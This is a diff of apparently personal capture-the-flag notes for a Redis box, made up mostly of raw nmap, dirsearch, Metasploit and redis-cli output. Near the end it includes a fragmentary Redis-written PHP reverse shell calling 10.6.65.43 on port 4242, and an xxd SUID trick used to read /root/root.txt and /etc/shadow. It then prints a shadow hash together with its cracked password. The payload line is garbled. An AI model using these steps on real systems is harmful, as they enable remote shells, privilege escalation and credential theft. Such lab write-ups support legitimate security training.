@@ -1,0 +1,423 @@
+
+
+   
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nmap 10.10.194.51
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-30 19:38 EDT
+Nmap scan report for 10.10.194.51
+Host is up (0.12s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 24.78 seconds
+ 
+
+
+
+
+
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nmap -sCV -A -T5 10.10.194.51
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-30 19:42 EDT
+Warning: 10.10.194.51 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.194.51
+Host is up (0.10s latency).
+Not shown: 981 closed ports
+PORT      STATE    SERVICE              VERSION
+33/tcp    filtered dsp
+80/tcp    open     http                 Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+99/tcp    filtered metagram
+163/tcp   filtered cmip-man
+992/tcp   filtered telnets
+1050/tcp  filtered java-or-OTGfileshare
+1199/tcp  filtered dmidi
+2007/tcp  filtered dectalk
+2126/tcp  filtered pktcable-cops
+2638/tcp  filtered sybase
+3367/tcp  filtered satvid-datalnk
+3476/tcp  filtered nppmp
+4126/tcp  filtered ddrepl
+4242/tcp  filtered vrml-multi-use
+5222/tcp  filtered xmpp-client
+6699/tcp  filtered napster
+13456/tcp filtered unknown
+44442/tcp filtered coldfusion-auth
+49165/tcp filtered unknown
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.22 seconds
+   
+
+
+
+
+                                                                                   
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nmap -sCV -p- -Pn --open --min-rate 5000 -T5 -vv 10.10.194.51 
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-30 19:57 EDT
+NSE: Loaded 153 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 19:57
+Completed NSE at 19:57, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 19:57
+Completed NSE at 19:57, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 19:57
+Completed NSE at 19:57, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 19:57
+Completed Parallel DNS resolution of 1 host. at 19:57, 0.63s elapsed
+Initiating Connect Scan at 19:57
+Scanning 10.10.194.51 [65535 ports]
+Discovered open port 80/tcp on 10.10.194.51
+Discovered open port 6379/tcp on 10.10.194.51
+Completed Connect Scan at 19:57, 21.04s elapsed (65535 total ports)
+Initiating Service scan at 19:57
+Scanning 2 services on 10.10.194.51
+Completed Service scan at 19:57, 6.24s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.194.51.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 19:57
+Completed NSE at 19:58, 3.46s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 19:58
+Completed NSE at 19:58, 1.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 19:58
+Completed NSE at 19:58, 0.00s elapsed
+Nmap scan report for 10.10.194.51
+Host is up, received user-set (0.14s latency).
+Scanned at 2021-06-30 19:57:29 EDT for 32s
+Not shown: 56856 closed ports, 8677 filtered ports
+Reason: 56856 conn-refused and 8677 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE REASON  VERSION
+80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+6379/tcp open  redis   syn-ack Redis key-value store 6.0.7
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 19:58
+Completed NSE at 19:58, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 19:58
+Completed NSE at 19:58, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 19:58
+Completed NSE at 19:58, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.73 seconds
+
+
+we get redis on port 6379   
+
+
+https://www.cvedetails.com/vulnerability-list/vendor_id-18560/product_id-47087/Redislabs-Redis.html
+
+
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo nmap -p6379 -Pn -O -T5 10.10.194.51                                   1 ⨯
+[sudo] password for kali: 
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-30 20:59 EDT
+Nmap scan report for 10.10.194.51
+Host is up (0.14s latency).
+
+PORT     STATE SERVICE
+6379/tcp open  redis
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds
+ 
+ 
+ 
+ 
+┌──(kali㉿kali)-[~/Downloads]
+└─$ dirsearch -r -u 10.10.194.51
+
+  _|. _ _  _  _  _ _|_    v0.4.1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30
+Wordlist size: 10877
+
+Output File: /home/kali/.dirsearch/reports/10.10.194.51/_21-06-30_21-00-59.txt
+
+Error Log: /home/kali/.dirsearch/logs/errors-21-06-30_21-00-59.log
+
+Target: http://10.10.194.51/
+
+[21:01:00] Starting: 
+[21:01:09] 403 -  277B  - /.ht_wsr.txt
+[21:01:09] 403 -  277B  - /.htaccess.bak1
+[21:01:09] 403 -  277B  - /.htaccess.sample
+[21:01:09] 403 -  277B  - /.htaccess.save
+[21:01:09] 403 -  277B  - /.htaccess.orig
+[21:01:09] 403 -  277B  - /.htaccess_sc
+[21:01:09] 403 -  277B  - /.htaccess_orig
+[21:01:09] 403 -  277B  - /.htaccess_extra
+[21:01:09] 403 -  277B  - /.htaccessOLD
+[21:01:09] 403 -  277B  - /.htaccessOLD2
+[21:01:09] 403 -  277B  - /.htaccessBAK
+[21:01:09] 403 -  277B  - /.htm
+[21:01:09] 403 -  277B  - /.html
+[21:01:09] 403 -  277B  - /.htpasswd_test
+[21:01:09] 403 -  277B  - /.htpasswds
+[21:01:09] 403 -  277B  - /.httr-oauth
+[21:01:11] 403 -  277B  - /.php
+[21:01:11] 403 -  277B  - /.php3
+[21:01:44] 200 -   11KB - /index.html
+[21:01:56] 403 -  277B  - /server-status
+[21:01:56] 403 -  277B  - /server-status/     (Added to queue)
+[21:02:04] Starting: server-status/
+[21:02:12] 404 -  274B  - /server-status/%2e%2e//google.com
+
+Task Completed
+  
+  
+went to write up and there is a ninja write up
+
+https://jc01.ninja/ctf/res/
+
+so we have to instal redis-tools
+
+basic redis commands
+
+https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
+
+
+
+msf6 auxiliary(scanner/redis/redis_server) > info
+
+       Name: Redis Command Execute Scanner
+     Module: auxiliary/scanner/redis/redis_server
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  iallison <ian@team-allison.com>
+  Nixawk
+
+Check supported:
+  No
+
+Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  COMMAND   INFO             yes       The Redis command to run
+  PASSWORD  foobared         no        Redis password for authentication test
+  RHOSTS    10.10.161.95     yes       The target host(s), range CIDR identifier,
+                                        or hosts file with syntax 'file:<path>'
+  RPORT     6379             yes       The target port (TCP)
+  THREADS   1                yes       The number of concurrent threads (max one
+                                       per host)
+
+Description:
+  This module locates Redis endpoints by attempting to run a specified 
+  Redis command.
+
+
+
+
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ redis-cli -h 10.10.161.95
+10.10.161.95:6379> info
+# Server
+redis_version:6.0.7
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:5c906d046e45ec07
+redis_mode:standalone
+os:Linux 4.4.0-189-generic x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:5.4.0
+process_id:639
+run_id:82a2a676713612fd2f4f5669beda23fb21f8801d
+tcp_port:6379
+uptime_in_seconds:508
+uptime_in_days:0
+hz:10
+configured_hz:10
+lru_clock:14533016
+executable:/home/vianka/redis-stable/src/redis-server
+config_file:/home/vianka/redis-stable/redis.conf
+io_threads_active:0
+
+# Clients
+connected_clients:1
+client_recent_max_input_buffer:4
+client_recent_max_output_buffer:0
+blocked_clients:0
+tracking_clients:0
+clients_in_timeout_table:0
+
+# Memory
+used_memory:588008
+used_memory_human:574.23K
+used_memory_rss:4849664
+used_memory_rss_human:4.62M
+used_memory_peak:588008
+used_memory_peak_human:574.23K
+used_memory_peak_perc:100.00%
+used_memory_overhead:541522
+used_memory_startup:524536
+used_memory_dataset:46486
+used_memory_dataset_perc:73.24%
+allocator_allocated:854256
+allocator_active:1146880
+allocator_resident:3383296
+total_system_memory:1038798848
+total_system_memory_human:990.68M
+used_memory_lua:37888
+used_memory_lua_human:37.00K
+used_memory_scripts:0
+used_memory_scripts_human:0B
+number_of_cached_scripts:0
+maxmemory:0
+maxmemory_human:0B
+maxmemory_policy:noeviction
+allocator_frag_ratio:1.34
+allocator_frag_bytes:292624
+allocator_rss_ratio:2.95
+allocator_rss_bytes:2236416
+rss_overhead_ratio:1.43
+rss_overhead_bytes:1466368
+mem_fragmentation_ratio:8.89
+mem_fragmentation_bytes:4304168
+mem_not_counted_for_evict:0
+mem_replication_backlog:0
+mem_clients_slaves:0
+mem_clients_normal:16986
+mem_aof_buffer:0
+mem_allocator:jemalloc-5.1.0
+active_defrag_running:0
+lazyfree_pending_objects:0
+
+# Persistence
+loading:0
+rdb_changes_since_last_save:0
+rdb_bgsave_in_progress:0
+rdb_last_save_time:1625145244
+rdb_last_bgsave_status:ok
+rdb_last_bgsave_time_sec:-1
+rdb_current_bgsave_time_sec:-1
+rdb_last_cow_size:0
+aof_enabled:0
+aof_rewrite_in_progress:0
+aof_rewrite_scheduled:0
+aof_last_rewrite_time_sec:-1
+aof_current_rewrite_time_sec:-1
+aof_last_bgrewrite_status:ok
+aof_last_write_status:ok
+aof_last_cow_size:0
+module_fork_in_progress:0
+module_fork_last_cow_size:0
+
+# Stats
+total_connections_received:5
+total_commands_processed:7
+instantaneous_ops_per_sec:0
+total_net_input_bytes:164
+total_net_output_bytes:29850
+instantaneous_input_kbps:0.00
+instantaneous_output_kbps:0.00
+rejected_connections:0
+sync_full:0
+sync_partial_ok:0
+sync_partial_err:0
+expired_keys:0
+expired_stale_perc:0.00
+expired_time_cap_reached_count:0
+expire_cycle_cpu_milliseconds:6
+evicted_keys:0
+keyspace_hits:0
+keyspace_misses:0
+pubsub_channels:0
+pubsub_patterns:0
+latest_fork_usec:0
+migrate_cached_sockets:0
+slave_expires_tracked_keys:0
+active_defrag_hits:0
+active_defrag_misses:0
+active_defrag_key_hits:0
+active_defrag_key_misses:0
+tracking_total_keys:0
+tracking_total_items:0
+tracking_total_prefixes:0
+unexpected_error_replies:0
+total_reads_processed:12
+total_writes_processed:7
+io_threaded_reads_processed:0
+io_threaded_writes_processed:0
+
+# Replication
+role:master
+connected_slaves:0
+master_replid:e4e920415e76e2fa59fb37b466a90202938404e4
+master_replid2:0000000000000000000000000000000000000000
+master_repl_offset:0
+second_repl_offset:-1
+repl_backlog_active:0
+repl_backlog_size:1048576
+repl_backlog_first_byte_offset:0
+repl_backlog_histlen:0
+
+# CPU
+used_cpu_sys:0.228000
+used_cpu_user:0.180000
+used_cpu_sys_children:0.000000
+used_cpu_user_children:0.000000
+
+# Modules
+
+# Cluster
+cluster_enabled:0
+
+# Keyspace
+
+
+
+set test '& /dev/tcp/10.6.65.43/4242 0>&1'\"); ?>'
+
+  
+sudo install -m =xs $(which xxd) .
+
+LFILE=/root/root.txt
+/usr/bin/xxd "$LFILE" | xxd -r
+
+
+LFILE=/etc/shadow
+/usr/bin/xxd "$LFILE" | xxd -r
+
+vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
+
+$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:beautiful1
+
+
+
+
+
+
+
+
+
+
